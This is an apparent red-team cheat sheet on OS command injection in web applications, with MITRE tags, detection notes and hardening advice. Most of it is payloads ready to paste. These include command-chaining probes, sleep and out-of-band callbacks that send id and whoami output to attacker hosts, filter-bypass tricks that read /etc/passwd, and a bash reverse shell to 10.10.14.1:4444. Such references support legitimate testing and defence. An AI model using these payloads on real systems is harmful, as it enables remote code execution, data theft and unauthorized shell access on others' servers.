---
title: "OS Command Injection"
category: "red-team"
tags: ["web", "injection", "rce", "owasp"]
platform: "web"
mitre: ["T1190", "T1059"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# OS Command Injection

## TL;DR
User input is passed to a system shell, letting you append your own commands. Anywhere the app shells out (ping/nslookup tools, image/PDF conversion, archive handling, git/DNS wrappers) is a candidate. Leads directly to RCE.

## Detecting the vulnerability
```bash
# Command separators / chaining (URL-encode as needed)
; id
| id
|| id
&& id
`id`
$(id)
%0a id          # newline
```

## Blind / time-based (no output reflected)
```bash
# Delay confirms execution
; sleep 5
& ping -c 5 127.0.0.1 &
$(sleep 5)
# Out-of-band: force a DNS/HTTP callback you control
; nslookup $(whoami).attacker.com
; curl http://attacker/$(id | base64)
```

## Filter bypass
```bash
# Spaces filtered
cat</etc/passwd            ${IFS}          {cat,/etc/passwd}
# Keyword filtering / obfuscation
c''at /etc/passwd          w`echo h`oami          $(printf 'id')
# Encoding
echo aWQ= | base64 -d | sh
# Blacklisted slashes
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

## Weaponize
```bash
# Reverse shell (see red-team/exploitation/reverse-shells.md)
; bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
```

## Detection (Blue Team)
- Web app spawning child processes (`sh -c`, `bash`, `ping`, `curl`, `nslookup`) — Sysmon 1 / auditd execve with the web user as parent.
- WAF/log patterns: `;`, `|`, `` ` ``, `$(`, `${IFS}`, base64+`|sh`; unexpected outbound DNS/HTTP callbacks.

## Mitigation / Hardening
- **Don't shell out.** Use language/library APIs instead of invoking a shell.
- If unavoidable: pass arguments as an **argv array** (no shell interpretation), never string-concatenate input.
- Strict allow-list validation of input; least-privilege service account; disable shell features where possible.
- See input-handling guidance: [appsec/secure-coding/input-validation](../../appsec/secure-coding/input-validation.md).

## Sources
- [PortSwigger – OS command injection](https://portswigger.net/web-security/os-command-injection) · [PayloadsAllTheThings – Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
